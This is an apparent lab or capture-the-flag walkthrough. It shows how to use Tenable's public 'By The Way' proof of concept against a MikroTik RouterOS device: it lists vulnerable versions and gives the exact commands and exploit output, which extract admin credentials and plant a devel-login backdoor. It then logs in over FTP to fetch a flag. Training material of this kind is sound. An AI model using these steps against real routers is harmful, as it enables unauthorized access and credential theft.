+++
title = "Exploitation"
date = 2021-10-18T20:39:54-06:00
weight = 10
+++


After searching online, we find that the version of Mikrotik/RouterOS should be vulnerable to an exploit called "By The Way"
### Exploitation

The following versions of Router OS are vulnerable to "ByTheWay" exploit:
```
Longterm: 6.30.1 - 6.40.7
Stable: 6.29 - 6.42
Beta: 6.29rc1 - 6.43rc3
```

The Tenable security team has created a POC for the "By The Way" exploit, found here: <a href="https://github.com/tenable/routeros/tree/master/poc/bytheway">https://github.com/tenable/routeros/tree/master/poc/bytheway</a>

The repo is already cloned, and the exploit compiled.

1. Navigate to `~/routeros/poc/bytheway/build`
```
cd ~/routeros/poc/bytheway/build
```

2. Run the exploit against the Mikrotik
```
./btw -i 172.21.0.4
```

You should see the following:
```
$ ./btw -i 172.21.0.4

   ╔╗ ┬ ┬  ┌┬┐┬ ┬┌─┐  ╦ ╦┌─┐┬ ┬
   ╠╩╗└┬┘   │ ├─┤├┤   ║║║├─┤└┬┘
   ╚═╝ ┴    ┴ ┴ ┴└─┘  ╚╩╝┴ ┴ ┴

[+] Attempting to connect to 172.21.0.4:8291
[+] Extracting user.dat...
[+] Searching for administrator credentials
[+] Using credentials - admin:sHby8Gzi292ZsnS
[+] Creating /pckg/option on 172.21.0.4:8291
[+] Creating /flash/nova/etc/devel-login on 172.21.0.4:8291
[+] There's a light on
```

3. We see that the exploit has extracted credentials for the admin user:

> admin:sHby8Gzi292ZsnS

4. Login to FTP  

```
$ ftp 172.21.0.4
```
Use the username and password to login.
```
Name (172.21.0.4:user): admin
331 Password required for admin
Password:
230 User admin logged in
Remote system type is UNIX.
```

Set the mode to Passive
```
ftp> passive
Passive mode on.
```

List the directory
```
ftp> ls
227 Entering Passive Mode (172,21,0,4,191,152).
150 Opening data connection
-rw-rw----   1 root     root           59 Oct 18 12:47 flag.txt
drwxrwx---   1 root     root         1024 Dec 31 18:00 flash
226 Transfer complete
```

Get the flag!
```
ftp> get flag.txt
local: flag.txt remote: flag.txt
227 Entering Passive Mode (172,21,0,4,208,214).
150 Opening ASCII mode data connection for /flag.txt (59 bytes)
226 ASCII transfer complete
59 bytes received in 0.00 secs (61.0999 kB/s)
```

Exit FTP
```
ftp> exit
221 Closing
```

5. Print the flag. Use this to solve the Hacker Challenge.
```
$ cat flag.txt
```
